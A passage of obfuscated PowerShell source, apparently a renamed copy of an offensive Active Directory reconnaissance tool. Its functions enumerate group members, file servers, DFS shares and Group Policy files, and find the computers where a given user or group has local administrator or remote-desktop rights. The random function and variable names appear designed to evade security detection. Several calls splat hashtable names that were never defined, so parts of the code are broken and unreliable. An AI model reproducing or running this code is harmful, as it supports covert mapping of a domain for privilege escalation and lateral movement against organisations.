                                    }
                                    else {
                                        $Hvxw9p9JhdtaGz9 = $True
                                    }
                                } 
                                catch [System.Management.Automation.MethodInvocationException] {
                                    $Hvxw9p9JhdtaGz9 = $True
                                }
                            }
                        } 
                        else {
                            $hyl9sdZlHEVp9Fr = $_.properties.member
                        }
                    } 
                    catch {
                        Write-Verbose $_
                    }
                }
            }

            $hyl9sdZlHEVp9Fr | Where-Object {$_} | ForEach-Object {

                if ($Okpdr9DpyZPCXBG -and $nwlVcuNJ9vIvFpP) {
                    $QQDWOvojOeRaVdg = $_.Properties
                } 
                else {
                    if($ewHsaEFeoXOCPPv) {
                        $txcsRvewcVdZtUk = [adsi]"LDAP://$ewHsaEFeoXOCPPv/$_"
                    }
                    else {
                        $txcsRvewcVdZtUk = [adsi]"LDAP://$_"
                    }
                    if($txcsRvewcVdZtUk){
                        $QQDWOvojOeRaVdg = $txcsRvewcVdZtUk.Properties
                    }
                }

                if($QQDWOvojOeRaVdg) {

                    if($QQDWOvojOeRaVdg.samaccounttype -notmatch '805306368') {
                        $YOTyzqWneVgW9pU = $True
                    }
                    else {
                        $YOTyzqWneVgW9pU = $False
                    }

                    if ($wD9BSmPbiJRFWDu) {
                        $cupWsdCi9OmiZFW = educates -QQDWOvojOeRaVdg $QQDWOvojOeRaVdg
                    }
                    else {
                        $cupWsdCi9OmiZFW = New-Object PSObject
                    }

                    $cupWsdCi9OmiZFW | Add-Member Noteproperty 'GroupDomain' $KKbtTlEQY9KtTfJ
                    $cupWsdCi9OmiZFW | Add-Member Noteproperty 'GroupName' $IMcPFmHY9nRwLzr

                    try {
                        $xvSQOBla99tFHuZ = $QQDWOvojOeRaVdg.distinguishedname[0]
                        

                        $xYut9BCXfRZcere = $xvSQOBla99tFHuZ.subString($xvSQOBla99tFHuZ.IndexOf("DC=")) -replace 'DC=','' -replace ',','.'
                    }
                    catch {
                        $xvSQOBla99tFHuZ = $Null
                        $xYut9BCXfRZcere = $Null
                    }

                    if ($QQDWOvojOeRaVdg.samaccountname) {

                        $NwZdSwEDaYuWiBx = $QQDWOvojOeRaVdg.samaccountname[0]
                    } 
                    else {

                        try {
                            $NwZdSwEDaYuWiBx = die $QQDWOvojOeRaVdg.cn[0]
                        }
                        catch {

                            $NwZdSwEDaYuWiBx = $QQDWOvojOeRaVdg.cn
                        }
                    }
                    
                    if($QQDWOvojOeRaVdg.objectSid) {
                        $cfPUdUOMgHKmSNZ = ((New-Object System.Security.Principal.SecurityIdentifier $QQDWOvojOeRaVdg.objectSid[0],0).Value)
                    }
                    else {
                        $cfPUdUOMgHKmSNZ = $Null
                    }

                    $cupWsdCi9OmiZFW | Add-Member Noteproperty 'MemberDomain' $xYut9BCXfRZcere
                    $cupWsdCi9OmiZFW | Add-Member Noteproperty 'MemberName' $NwZdSwEDaYuWiBx
                    $cupWsdCi9OmiZFW | Add-Member Noteproperty 'MemberSid' $cfPUdUOMgHKmSNZ
                    $cupWsdCi9OmiZFW | Add-Member Noteproperty 'IsGroup' $YOTyzqWneVgW9pU
                    $cupWsdCi9OmiZFW | Add-Member Noteproperty 'MemberDN' $xvSQOBla99tFHuZ
                    $cupWsdCi9OmiZFW


                    if ($Okpdr9DpyZPCXBG -and !$nwlVcuNJ9vIvFpP -and $YOTyzqWneVgW9pU -and $NwZdSwEDaYuWiBx) {
                        confessedly -wD9BSmPbiJRFWDu -KKbtTlEQY9KtTfJ $xYut9BCXfRZcere -ewHsaEFeoXOCPPv $ewHsaEFeoXOCPPv -hIqWczrXxNjFAmP $NwZdSwEDaYuWiBx -Okpdr9DpyZPCXBG -WRYKTaHSEUSKduK $WRYKTaHSEUSKduK
                    }
                }

            }
        }
    }
}


function aqueduct {


    [CmdletBinding()]
    param(
        [String]
        $KKbtTlEQY9KtTfJ,

        [String]
        $ewHsaEFeoXOCPPv,

        [String[]]
        $UTTmFmFvggDWcqw,

        [ValidateRange(1,10000)] 
        [Int]
        $WRYKTaHSEUSKduK = 200
    )

    function pileups {

        param([String]$Path)

        if ($Path -and ($Path.split("\\").Count -ge 3)) {
            $Temp = $Path.split("\\")[2]
            if($Temp -and ($Temp -ne '')) {
                $Temp
            }
        }
    }

    Houyhnhnm -KKbtTlEQY9KtTfJ $KKbtTlEQY9KtTfJ -ewHsaEFeoXOCPPv $ewHsaEFeoXOCPPv -WRYKTaHSEUSKduK $WRYKTaHSEUSKduK | Where-Object {$_} | Where-Object {

            if($UTTmFmFvggDWcqw) {
                $UTTmFmFvggDWcqw -Match $_.samAccountName
            }
            else { $True } 
        } | Foreach-Object {

            if($_.homedirectory) {
                pileups($_.homedirectory)
            }
            if($_.scriptpath) {
                pileups($_.scriptpath)
            }
            if($_.profilepath) {
                pileups($_.profilepath)
            }

        } | Where-Object {$_} | Sort-Object -Unique
}


function marinated {


    [CmdletBinding()]
    param(
        [String]
        [ValidateSet("All","V1","1","V2","2")]
        $o9lSUJrnGtMCVJG = "All",

        [String]
        $KKbtTlEQY9KtTfJ,

        [String]
        $ewHsaEFeoXOCPPv,

        [String]
        $GazxKCLDhxrDzgZ,

        [ValidateRange(1,10000)] 
        [Int]
        $WRYKTaHSEUSKduK = 200
    )

    function merchandising {
        [CmdletBinding()]
        param(
            [String]
            $KKbtTlEQY9KtTfJ,

            [String]
            $ewHsaEFeoXOCPPv,

            [String]
            $GazxKCLDhxrDzgZ,

            [ValidateRange(1,10000)] 
            [Int]
            $WRYKTaHSEUSKduK = 200
        )

        $nSPeQWyAWywEEck = synonym -KKbtTlEQY9KtTfJ $KKbtTlEQY9KtTfJ -ewHsaEFeoXOCPPv $ewHsaEFeoXOCPPv -GazxKCLDhxrDzgZ $GazxKCLDhxrDzgZ -WRYKTaHSEUSKduK $WRYKTaHSEUSKduK

        if($nSPeQWyAWywEEck) {
            $EfnqXbSEJyksPGJ = @()
            $nSPeQWyAWywEEck.filter = "(&(objectClass=fTDfs))"

            try {
                $nSPeQWyAWywEEck.FindAll() | Where-Object {$_} | ForEach-Object {
                    $QQDWOvojOeRaVdg = $_.Properties
                    $N9SaGuMooDdxPkR = $QQDWOvojOeRaVdg.remoteservername

                    $EfnqXbSEJyksPGJ += $N9SaGuMooDdxPkR | ForEach-Object {
                        try {
                            if ( $_.Contains('\') ) {
                                New-Object -TypeName PSObject -Property @{'Name'=$QQDWOvojOeRaVdg.name[0];'RemoteServerName'=$_.split("\")[2]}
                            }
                        }
                        catch {
                            Write-Debug "Error in parsing DFS share : $_"
                        }
                    }
                }
            }
            catch {
                Write-Warning "visible error : $_"
            }
            $EfnqXbSEJyksPGJ | Sort-Object -Property "RemoteServerName"
        }
    }

    function visible {
        [CmdletBinding()]
        param(
            [String]
            $KKbtTlEQY9KtTfJ,

            [String]
            $ewHsaEFeoXOCPPv,

            [String]
            $GazxKCLDhxrDzgZ,

            [ValidateRange(1,10000)] 
            [Int]
            $WRYKTaHSEUSKduK = 200
        )

        $nSPeQWyAWywEEck = synonym -KKbtTlEQY9KtTfJ $KKbtTlEQY9KtTfJ -ewHsaEFeoXOCPPv $ewHsaEFeoXOCPPv -GazxKCLDhxrDzgZ $GazxKCLDhxrDzgZ -WRYKTaHSEUSKduK $WRYKTaHSEUSKduK

        if($nSPeQWyAWywEEck) {
            $EfnqXbSEJyksPGJ = @()
            $nSPeQWyAWywEEck.filter = "(&(objectClass=msDFS-Linkv2))"
            $nSPeQWyAWywEEck.PropertiesToLoad.AddRange(('msdfs-linkpathv2','msDFS-TargetListv2'))

            try {
                $nSPeQWyAWywEEck.FindAll() | Where-Object {$_} | ForEach-Object {
                    $QQDWOvojOeRaVdg = $_.Properties
                    $k9RP9BiAGJeoVP9 = $QQDWOvojOeRaVdg.'msdfs-targetlistv2'[0]
                    $xml = [xml][System.Text.Encoding]::Unicode.GetString($k9RP9BiAGJeoVP9[2..($k9RP9BiAGJeoVP9.Length-1)])
                    $EfnqXbSEJyksPGJ += $xml.targets.ChildNodes | ForEach-Object {
                        try {
                            $fxypKcr9J9VymE9 = $_.InnerText
                            if ( $fxypKcr9J9VymE9.Contains('\') ) {
                                $9PCvUNlsPnbhQjT = $fxypKcr9J9VymE9.split("\")[3]
                                $TilFbThC9OGPMJZ = $QQDWOvojOeRaVdg.'msdfs-linkpathv2'[0]
                                New-Object -TypeName PSObject -Property @{'Name'="$9PCvUNlsPnbhQjT$TilFbThC9OGPMJZ";'RemoteServerName'=$fxypKcr9J9VymE9.split("\")[2]}
                            }
                        }
                        catch {
                            Write-Debug "Error in parsing target : $_"
                        }
                    }
                }
            }
            catch {
                Write-Warning "visible error : $_"
            }
            $EfnqXbSEJyksPGJ | Sort-Object -Unique -Property "RemoteServerName"
        }
    }

    $EfnqXbSEJyksPGJ = @()
    
    if ( ($o9lSUJrnGtMCVJG -eq "all") -or ($o9lSUJrnGtMCVJG.endsWith("1")) ) {
        $EfnqXbSEJyksPGJ += merchandising -KKbtTlEQY9KtTfJ $KKbtTlEQY9KtTfJ -ewHsaEFeoXOCPPv $ewHsaEFeoXOCPPv -GazxKCLDhxrDzgZ $GazxKCLDhxrDzgZ -WRYKTaHSEUSKduK $WRYKTaHSEUSKduK
    }
    if ( ($o9lSUJrnGtMCVJG -eq "all") -or ($o9lSUJrnGtMCVJG.endsWith("2")) ) {
        $EfnqXbSEJyksPGJ += visible -KKbtTlEQY9KtTfJ $KKbtTlEQY9KtTfJ -ewHsaEFeoXOCPPv $ewHsaEFeoXOCPPv -GazxKCLDhxrDzgZ $GazxKCLDhxrDzgZ -WRYKTaHSEUSKduK $WRYKTaHSEUSKduK
    }

    $EfnqXbSEJyksPGJ | Sort-Object -Property "RemoteServerName"
}








function sympathy {


    [CmdletBinding()]
    Param (
        [Parameter(Mandatory=$True, ValueFromPipeline=$True)]
        [String]
        $CuAlenb9adLl9Ut,

        [Switch]
        $9MCpeEay99VfrvP
    )

    begin {
        if($9MCpeEay99VfrvP) {

            $Parts = $CuAlenb9adLl9Ut.split('\')
            $lsDCwNmlDuPYL9m = $Parts[0..($Parts.length-2)] -join '\'
            $QQxmdPmFgnSXPuF = $Parts[-1]
            $stuyr9AcTK99icR = ("abcdefghijklmnopqrstuvwxyz".ToCharArray() | Get-Random -Count 7) -join ''
            
            Write-Verbose "Mounting path $CuAlenb9adLl9Ut using a temp PSDrive at $stuyr9AcTK99icR"

            try {
                $Null = New-PSDrive -Name $stuyr9AcTK99icR -PSProvider FileSystem -Root $lsDCwNmlDuPYL9m  -ErrorAction Stop
            }
            catch {
                Write-Debug "Error mounting path $CuAlenb9adLl9Ut : $_"
                return $Null
            }


            $CuAlenb9adLl9Ut = $stuyr9AcTK99icR + ":\" + $QQxmdPmFgnSXPuF
        } 
    }

    process {
        $NtV9pwpCBhJyHOP = ''
        $rpGDkSOrMgcSPxi = @{}
        $InmPxTdm9YCxshM = @{}

        try {

            if(Test-Path $CuAlenb9adLl9Ut) {

                Write-Verbose "Parsing $CuAlenb9adLl9Ut"

                Get-Content $CuAlenb9adLl9Ut -ErrorAction Stop | Foreach-Object {
                    if ($_ -match '\[') {

                        $NtV9pwpCBhJyHOP = $_.trim('[]') -replace ' ',''
                    }
                    elseif($_ -match '=') {
                        $Parts = $_.split('=')
                        $iHWDtsdmYLrFDrT = $Parts[0].trim()
                        $IAmtMUszoWb9kSN = $Parts[1].trim()

                        if($IAmtMUszoWb9kSN -match ',') {
                            $IAmtMUszoWb9kSN = $IAmtMUszoWb9kSN.split(',')
                        }

                        if(!$rpGDkSOrMgcSPxi[$NtV9pwpCBhJyHOP]) {
                            $rpGDkSOrMgcSPxi.Add($NtV9pwpCBhJyHOP, @{})
                        }


                        $rpGDkSOrMgcSPxi[$NtV9pwpCBhJyHOP].Add( $iHWDtsdmYLrFDrT, $IAmtMUszoWb9kSN )
                    }
                }

                ForEach ($99VxGScgHONgRIt in $rpGDkSOrMgcSPxi.keys) {

                    $InmPxTdm9YCxshM[$99VxGScgHONgRIt] = New-Object PSObject -Property $rpGDkSOrMgcSPxi[$99VxGScgHONgRIt]
                }


                New-Object PSObject -Property $InmPxTdm9YCxshM
            }
        }
        catch {
            Write-Debug "Error parsing $CuAlenb9adLl9Ut : $_"
        }
    }

    end {
        if($9MCpeEay99VfrvP -and $stuyr9AcTK99icR) {
            Write-Verbose "Removing temp PSDrive $stuyr9AcTK99icR"
            Get-PSDrive -Name $stuyr9AcTK99icR -ErrorAction SilentlyContinue | Remove-PSDrive
        }
    }
}


function viscounts {


    [CmdletBinding()]
    Param (
        [Parameter(Mandatory=$True, ValueFromPipeline=$True)]
        [String]
        $ObiqNdPSJajZhvX,

        [Switch]
        $mcQZHcUBOH99UnL,

        [Switch]
        $9MCpeEay99VfrvP
    )

    begin {
        if($9MCpeEay99VfrvP) {

            $Parts = $ObiqNdPSJajZhvX.split('\')
            $lsDCwNmlDuPYL9m = $Parts[0..($Parts.length-2)] -join '\'
            $QQxmdPmFgnSXPuF = $Parts[-1]
            $stuyr9AcTK99icR = ("abcdefghijklmnopqrstuvwxyz".ToCharArray() | Get-Random -Count 7) -join ''
            
            Write-Verbose "Mounting path $ObiqNdPSJajZhvX using a temp PSDrive at $stuyr9AcTK99icR"

            try {
                $Null = New-PSDrive -Name $stuyr9AcTK99icR -PSProvider FileSystem -Root $lsDCwNmlDuPYL9m  -ErrorAction Stop
            }
            catch {
                Write-Debug "Error mounting path $ObiqNdPSJajZhvX : $_"
                return $Null
            }


            $ObiqNdPSJajZhvX = $stuyr9AcTK99icR + ":\" + $QQxmdPmFgnSXPuF
        } 
    }

    process {


        if(Test-Path $ObiqNdPSJajZhvX) {

            [xml] $HUwnrHdbkUOCULT = Get-Content $ObiqNdPSJajZhvX


            $HUwnrHdbkUOCULT | Select-Xml "//Group" | Select-Object -ExpandProperty node | ForEach-Object {

                $hyl9sdZlHEVp9Fr = @()
                $nFCQfKcVdCNdDZi = @()


                $EcsUI9WmYB9f9ez = $_.Properties.GroupSid
                if(!$EcsUI9WmYB9f9ez) {
                    if($_.Properties.groupName -match 'Administrators') {
                        $EcsUI9WmYB9f9ez = 'S-1-5-32-544'
                    }
                    elseif($_.Properties.groupName -match 'Remote Desktop') {
                        $EcsUI9WmYB9f9ez = 'S-1-5-32-555'
                    }
                    else {
                        $EcsUI9WmYB9f9ez = $_.Properties.groupName
                    }
                }
                $nFCQfKcVdCNdDZi = @($EcsUI9WmYB9f9ez)

                $_.Properties.members | ForEach-Object {

                    $_ | Select-Object -ExpandProperty Member | Where-Object { $_.action -match 'ADD' } | ForEach-Object {

                        if($_.sid) {
                            $hyl9sdZlHEVp9Fr += $_.sid
                        }
                        else {

                            $hyl9sdZlHEVp9Fr += $_.name
                        }
                    }
                }

                if ($hyl9sdZlHEVp9Fr -or $nFCQfKcVdCNdDZi) {

                    $vYNUAKggDmqf9Gr = $_.filters | ForEach-Object {
                        $_ | Select-Object -ExpandProperty Filter* | ForEach-Object {
                            New-Object -TypeName PSObject -Property @{'Type' = $_.LocalName;'Value' = $_.name}
                        }
                    }

                    if($mcQZHcUBOH99UnL) {
                        $nFCQfKcVdCNdDZi = $nFCQfKcVdCNdDZi | ForEach-Object {die $_}
                        $hyl9sdZlHEVp9Fr = $hyl9sdZlHEVp9Fr | ForEach-Object {die $_}
                    }

                    if($nFCQfKcVdCNdDZi -isnot [system.array]) {$nFCQfKcVdCNdDZi = @($nFCQfKcVdCNdDZi)}
                    if($hyl9sdZlHEVp9Fr -isnot [system.array]) {$hyl9sdZlHEVp9Fr = @($hyl9sdZlHEVp9Fr)}

                    $EqRpT9vmStiYtTJ = @{
                        'GPODisplayName' = $PZuykuCgQ9FVJRc
                        'GPOName' = $MUEYXRiBzadQKBt
                        'GPOPath' = $ObiqNdPSJajZhvX
                        'Filters' = $vYNUAKggDmqf9Gr
                        'MemberOf' = $nFCQfKcVdCNdDZi
                        'Members' = $hyl9sdZlHEVp9Fr
                    }

                    New-Object -TypeName PSObject -Property $EqRpT9vmStiYtTJ
                }
            }
        }
    }

    end {
        if($9MCpeEay99VfrvP -and $stuyr9AcTK99icR) {
            Write-Verbose "Removing temp PSDrive $stuyr9AcTK99icR"
            Get-PSDrive -Name $stuyr9AcTK99icR -ErrorAction SilentlyContinue | Remove-PSDrive
        }
    }
}



function Duracell {

    [CmdletBinding()]
    Param (
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $MUEYXRiBzadQKBt = '*',

        [String]
        $tiSquJFYnXmnfu9,

        [String]
        $KKbtTlEQY9KtTfJ,

        [String]
        $ewHsaEFeoXOCPPv,
        
        [String]
        $GazxKCLDhxrDzgZ,

        [ValidateRange(1,10000)] 
        [Int]
        $WRYKTaHSEUSKduK = 200

    )

    begin {
        $P9ZXrx9fSKdkWGq = synonym -KKbtTlEQY9KtTfJ $KKbtTlEQY9KtTfJ -ewHsaEFeoXOCPPv $ewHsaEFeoXOCPPv -GazxKCLDhxrDzgZ $GazxKCLDhxrDzgZ -WRYKTaHSEUSKduK $WRYKTaHSEUSKduK
    }

    process {
        if ($P9ZXrx9fSKdkWGq) {
            if($tiSquJFYnXmnfu9) {
                $P9ZXrx9fSKdkWGq.filter="(&(objectCategory=groupPolicyContainer)(displayname=$tiSquJFYnXmnfu9))"
            }
            else {
                $P9ZXrx9fSKdkWGq.filter="(&(objectCategory=groupPolicyContainer)(name=$MUEYXRiBzadQKBt))"
            }

            $P9ZXrx9fSKdkWGq.FindAll() | Where-Object {$_} | ForEach-Object {

                educates -QQDWOvojOeRaVdg $_.Properties
            }
        }
    }
}


function rubberizing {


    [CmdletBinding()]
    Param (
        [String]
        $MUEYXRiBzadQKBt = '*',

        [String]
        $tiSquJFYnXmnfu9,

        [Switch]
        $mcQZHcUBOH99UnL,

        [String]
        $KKbtTlEQY9KtTfJ,

        [String]
        $ewHsaEFeoXOCPPv,

        [String]
        $GazxKCLDhxrDzgZ,

        [Switch]
        $9MCpeEay99VfrvP,

        [ValidateRange(1,10000)] 
        [Int]
        $WRYKTaHSEUSKduK = 200
    )


    Duracell -GPOName $MUEYXRiBzadQKBt -tiSquJFYnXmnfu9 $MUEYXRiBzadQKBt -KKbtTlEQY9KtTfJ $KKbtTlEQY9KtTfJ -ewHsaEFeoXOCPPv $ewHsaEFeoXOCPPv -GazxKCLDhxrDzgZ $GazxKCLDhxrDzgZ -WRYKTaHSEUSKduK $WRYKTaHSEUSKduK | Foreach-Object {

        $nFCQfKcVdCNdDZi = $Null
        $hyl9sdZlHEVp9Fr = $Null
        $PZuykuCgQ9FVJRc = $_.displayname
        $MUEYXRiBzadQKBt = $_.name
        $ZYMMOwLJQjpuIoY = $_.gpcfilesyspath

        $tcSMIos9ejmE9ua =  @{
            'GptTmplPath' = "$ZYMMOwLJQjpuIoY\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf"
            'UsePSDrive' = $9MCpeEay99VfrvP
        }


        $Inf = sympathy @ParseArgs

        if($Inf.GroupMembership) {

            $nFCQfKcVdCNdDZi = $Inf.GroupMembership | Get-Member *Memberof | ForEach-Object { $Inf.GroupMembership.($_.name) } | ForEach-Object { $_.trim('*') }
            $hyl9sdZlHEVp9Fr = $Inf.GroupMembership | Get-Member *Members | ForEach-Object { $Inf.GroupMembership.($_.name) } | ForEach-Object { $_.trim('*') }


            if ($hyl9sdZlHEVp9Fr -or $nFCQfKcVdCNdDZi) {


                if(!$nFCQfKcVdCNdDZi) {
                    $nFCQfKcVdCNdDZi = 'S-1-5-32-544'
                }

                if($mcQZHcUBOH99UnL) {
                    $nFCQfKcVdCNdDZi = $nFCQfKcVdCNdDZi | ForEach-Object {die $_}
                    $hyl9sdZlHEVp9Fr = $hyl9sdZlHEVp9Fr | ForEach-Object {die $_}
                }

                if($nFCQfKcVdCNdDZi -isnot [system.array]) {$nFCQfKcVdCNdDZi = @($nFCQfKcVdCNdDZi)}
                if($hyl9sdZlHEVp9Fr -isnot [system.array]) {$hyl9sdZlHEVp9Fr = @($hyl9sdZlHEVp9Fr)}

                $EqRpT9vmStiYtTJ = @{
                    'GPODisplayName' = $PZuykuCgQ9FVJRc
                    'GPOName' = $MUEYXRiBzadQKBt
                    'GPOPath' = $ZYMMOwLJQjpuIoY
                    'Filters' = $Null
                    'MemberOf' = $nFCQfKcVdCNdDZi
                    'Members' = $hyl9sdZlHEVp9Fr
                }

                New-Object -TypeName PSObject -Property $EqRpT9vmStiYtTJ
            }
        }

        $tcSMIos9ejmE9ua =  @{
            'GroupsXMLpath' = "$ZYMMOwLJQjpuIoY\MACHINE\Preferences\Groups\Groups.xml"
            'ResolveSids' = $mcQZHcUBOH99UnL
            'UsePSDrive' = $9MCpeEay99VfrvP
        }

        viscounts @ParseArgs
    }
}


function chromes {


    [CmdletBinding()]
    Param (
        [String]
        $IuM9ojehadqRMJF,

        [String]
        $hIqWczrXxNjFAmP,

        [String]
        $KKbtTlEQY9KtTfJ,

        [String]
        $ewHsaEFeoXOCPPv,

        [String]
        $sVo9SkTymeeUBa9 = 'Administrators',
        
        [Switch]
        $9MCpeEay99VfrvP,

        [ValidateRange(1,10000)] 
        [Int]
        $WRYKTaHSEUSKduK = 200
    )

    if($IuM9ojehadqRMJF) {

        $User = Houyhnhnm -IuM9ojehadqRMJF $IuM9ojehadqRMJF -KKbtTlEQY9KtTfJ $KKbtTlEQY9KtTfJ -ewHsaEFeoXOCPPv $ewHsaEFeoXOCPPv -WRYKTaHSEUSKduK $WRYKTaHSEUSKduK
        $OPaZV9ZgMywUcRV = $User.objectsid

        if(!$OPaZV9ZgMywUcRV) {    
            Throw "User '$IuM9ojehadqRMJF' not found!"
        }

        $mfQFGkOl9oEBn99 = $OPaZV9ZgMywUcRV
        $deYAHChKWaZzstn = $User.samaccountname
        $pqAeWhEJJY9EfOb = $User.distinguishedname
    }
    elseif($hIqWczrXxNjFAmP) {

        $Group = reapportioned -hIqWczrXxNjFAmP $hIqWczrXxNjFAmP -KKbtTlEQY9KtTfJ $KKbtTlEQY9KtTfJ -ewHsaEFeoXOCPPv $ewHsaEFeoXOCPPv -wD9BSmPbiJRFWDu -WRYKTaHSEUSKduK $WRYKTaHSEUSKduK
        $FzXbWkbhyBLRNeh = $Group.objectsid

        if(!$FzXbWkbhyBLRNeh) {    
            Throw "Group '$hIqWczrXxNjFAmP' not found!"
        }

        $mfQFGkOl9oEBn99 = $FzXbWkbhyBLRNeh
        $deYAHChKWaZzstn = $Group.samaccountname
        $pqAeWhEJJY9EfOb = $Group.distinguishedname
    }
    else {
        throw "-UserName or -hIqWczrXxNjFAmP must be specified!"
    }

    if($sVo9SkTymeeUBa9 -like "*Admin*") {
        $EcsUI9WmYB9f9ez = "S-1-5-32-544"
    }
    elseif ( ($sVo9SkTymeeUBa9 -like "*RDP*") -or ($sVo9SkTymeeUBa9 -like "*Remote*") ) {
        $EcsUI9WmYB9f9ez = "S-1-5-32-555"
    }
    elseif ($sVo9SkTymeeUBa9 -like "S-1-5*") {
        $EcsUI9WmYB9f9ez = $sVo9SkTymeeUBa9
    }
    else {
        throw "LocalGroup must be 'Administrators', 'RDP', or a 'S-1-5-X' type sid."
    }

    Write-Verbose "LocalSid: $EcsUI9WmYB9f9ez"
    Write-Verbose "TargetSid: $mfQFGkOl9oEBn99"
    Write-Verbose "TargetObjectDistName: $pqAeWhEJJY9EfOb"

    if($mfQFGkOl9oEBn99 -isnot [system.array]) { $mfQFGkOl9oEBn99 = @($mfQFGkOl9oEBn99) }



    $mfQFGkOl9oEBn99 += reapportioned -KKbtTlEQY9KtTfJ $KKbtTlEQY9KtTfJ -ewHsaEFeoXOCPPv $ewHsaEFeoXOCPPv -WRYKTaHSEUSKduK $WRYKTaHSEUSKduK -IuM9ojehadqRMJF $deYAHChKWaZzstn -o9ogSiZcEWqV9BA

    if($mfQFGkOl9oEBn99 -isnot [system.array]) { $mfQFGkOl9oEBn99 = @($mfQFGkOl9oEBn99) }

    Write-Verbose "Effective target sids: $mfQFGkOl9oEBn99"

    $ynAZCQHWrgELykl =  @{
        'Domain' = $KKbtTlEQY9KtTfJ
        'DomainController' = $ewHsaEFeoXOCPPv
        'UsePSDrive' = $9MCpeEay99VfrvP
        'PageSize' = $WRYKTaHSEUSKduK
    }



    $AecHRMVA9XTAwoJ = rubberizing @GPOGroupArgs | ForEach-Object {
        
        if ($_.members) {
            $_.members = $_.members | Where-Object {$_} | ForEach-Object {
                if($_ -match "S-1-5") {
                    $_
                }
                else {

                    replays -OADAUGURRbgtTDp $_ -KKbtTlEQY9KtTfJ $KKbtTlEQY9KtTfJ
                }
            }


            if($_.members -isnot [system.array]) { $_.members = @($_.members) }
            if($_.memberof -isnot [system.array]) { $_.memberof = @($_.memberof) }
            
            if($_.members) {
                try {



                    if( (Compare-Object -ReferenceObject $_.members -DifferenceObject $mfQFGkOl9oEBn99 -IncludeEqual -ExcludeDifferent) ) {
                        if ($_.memberof -contains $EcsUI9WmYB9f9ez) {
                            $_
                        }
                    }
                } 
                catch {
                    Write-Debug "Error comparing members and $mfQFGkOl9oEBn99 : $_"
                }
            }
        }
    }

    Write-Verbose "GPOgroups: $AecHRMVA9XTAwoJ"
    $f99GLIVoPlocsPj = @{}


    $AecHRMVA9XTAwoJ | Where-Object {$_} | ForEach-Object {

        $QaGkwmAbKGFXdbp = $_.GPOName

        if( -not $f99GLIVoPlocsPj[$QaGkwmAbKGFXdbp] ) {
            $MUEYXRiBzadQKBt = $_.GPODisplayName
            $vYNUAKggDmqf9Gr = $_.Filters


            damsels -KKbtTlEQY9KtTfJ $KKbtTlEQY9KtTfJ -ewHsaEFeoXOCPPv $ewHsaEFeoXOCPPv -GUID $QaGkwmAbKGFXdbp -wD9BSmPbiJRFWDu -WRYKTaHSEUSKduK $WRYKTaHSEUSKduK | ForEach-Object {

                if($vYNUAKggDmqf9Gr) {


                    $WcYrXSKezmIAPFI = Randal -GazxKCLDhxrDzgZ $_.ADSpath -wD9BSmPbiJRFWDu -WRYKTaHSEUSKduK $WRYKTaHSEUSKduK | Where-Object {
                        $_.adspath -match ($vYNUAKggDmqf9Gr.Value)
                    } | ForEach-Object { $_.dnshostname }
                }
                else {
                    $WcYrXSKezmIAPFI = Randal -GazxKCLDhxrDzgZ $_.ADSpath -WRYKTaHSEUSKduK $WRYKTaHSEUSKduK
                }

                $tC9zUhRVZLbcv9W = New-Object PSObject
                $tC9zUhRVZLbcv9W | Add-Member Noteproperty 'ObjectName' $pqAeWhEJJY9EfOb
                $tC9zUhRVZLbcv9W | Add-Member Noteproperty 'GPOname' $MUEYXRiBzadQKBt
                $tC9zUhRVZLbcv9W | Add-Member Noteproperty 'GPOguid' $QaGkwmAbKGFXdbp
                $tC9zUhRVZLbcv9W | Add-Member Noteproperty 'ContainerName' $_.distinguishedname
                $tC9zUhRVZLbcv9W | Add-Member Noteproperty 'Computers' $WcYrXSKezmIAPFI
                $tC9zUhRVZLbcv9W
            }


























            $f99GLIVoPlocsPj[$QaGkwmAbKGFXdbp] = $True
        }
    }

}


function proselytizes {


    [CmdletBinding()]
    Param (
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $kEneZcxTTiuFrPZ,

        [String]
        $VRGbNLtUx9yJcd9,

        [String]
        $KKbtTlEQY9KtTfJ,

        [String]
        $ewHsaEFeoXOCPPv,

        [Switch]
        $Okpdr9DpyZPCXBG,

        [String]
        $sVo9SkTymeeUBa9 = 'Administrators',

        [Switch]
        $9MCpeEay99VfrvP,

        [ValidateRange(1,10000)] 
        [Int]
        $WRYKTaHSEUSKduK = 200
    )

    process {
    
        if(!$kEneZcxTTiuFrPZ -and !$VRGbNLtUx9yJcd9) {
            Throw "-ComputerName or -VRGbNLtUx9yJcd9 must be provided"
        }

        if($kEneZcxTTiuFrPZ) {
            $BssHxUXCedJKZpj = Randal -kEneZcxTTiuFrPZ $kEneZcxTTiuFrPZ -KKbtTlEQY9KtTfJ $KKbtTlEQY9KtTfJ -ewHsaEFeoXOCPPv $ewHsaEFeoXOCPPv -wD9BSmPbiJRFWDu -WRYKTaHSEUSKduK $WRYKTaHSEUSKduK

            if(!$BssHxUXCedJKZpj) {
                throw "Computer $SiEWnqfdNZWbTmF in domain '$KKbtTlEQY9KtTfJ' not found!"
            }
            
            ForEach($SiEWnqfdNZWbTmF in $BssHxUXCedJKZpj) {

                $DN = $SiEWnqfdNZWbTmF.distinguishedname

                $txlioIgrpAVfylk = $DN.split(",") | Foreach-Object {
                    if($_.startswith("OU=")) {
                        $DN.substring($DN.indexof($_))
                    }
                }
            }
        }
        else {
            $txlioIgrpAVfylk = @($VRGbNLtUx9yJcd9)
        }

        Write-Verbose "Target OUs: $txlioIgrpAVfylk"

        $txlioIgrpAVfylk | Where-Object {$_} | Foreach-Object {

            $OU = $_


            $AecHRMVA9XTAwoJ = damsels -KKbtTlEQY9KtTfJ $KKbtTlEQY9KtTfJ -ewHsaEFeoXOCPPv $ewHsaEFeoXOCPPv -GazxKCLDhxrDzgZ $_ -wD9BSmPbiJRFWDu -WRYKTaHSEUSKduK $WRYKTaHSEUSKduK | Foreach-Object { 

                $_.gplink.split("][") | Foreach-Object {
                    if ($_.startswith("LDAP")) {
                        $_.split(";")[0]
                    }
                }
            } | Foreach-Object {
                $ynAZCQHWrgELykl =  @{
                    'Domain' = $KKbtTlEQY9KtTfJ
                    'DomainController' = $ewHsaEFeoXOCPPv
                    'ADSpath' = $_
                    'UsePSDrive' = $9MCpeEay99VfrvP
                    'PageSize' = $WRYKTaHSEUSKduK
                }


                rubberizing @GPOGroupArgs
            }


            $AecHRMVA9XTAwoJ | Where-Object {$_} | Foreach-Object {
                $GPO = $_
                $GPO.members | Foreach-Object {


